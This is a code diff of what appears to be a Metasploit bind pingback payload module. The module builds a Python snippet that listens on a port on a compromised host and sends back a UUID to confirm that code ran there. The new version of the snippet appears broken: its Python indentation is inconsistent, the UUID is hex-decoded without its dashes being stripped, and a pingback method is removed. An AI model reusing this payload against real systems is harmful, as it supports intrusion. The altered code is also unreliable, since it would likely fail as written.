@@ -32,25 +32,18 @@ module MetasploitModule
 
   def command_string
     self.pingback_uuid ||= self.generate_pingback_uuid
-
-    cmd  = "import socket as s\n"
-    cmd << "so=s.socket(s.AF_INET,s.SOCK_STREAM)\n"
-    cmd << "try:\n"
-    cmd << " so.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)\n"
-    cmd << " so.bind(('0.0.0.0',#{ datastore['LPORT']}))\n"
-    cmd << " so.listen(1)\n"
-    cmd << " so,addr=so.accept()\n"
-    cmd << " so.send('#{self.pingback_uuid.gsub('-','')}'.decode('hex'))\n"
-    cmd << " so.close()\n"
-    cmd << "except:\n"
-    cmd << " pass\n"
-
-   cmd
- end
-
-  def include_send_pingback
-    true
+    cmd = <<~PYTHON
+      import socket as s
+      so=s.socket(s.AF_INET,s.SOCK_STREAM)
+        try:
+          so.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
+          so.bind(('0.0.0.0', #{ datastore['LPORT']}))
+          so.listen(1)
+          so,addr=so.accept()
+          so.send('#{self.pingback_uuid}'.decode('hex'))
+          so.close()
+        except:
+          pass
+    PYTHON
   end
 end
-
-
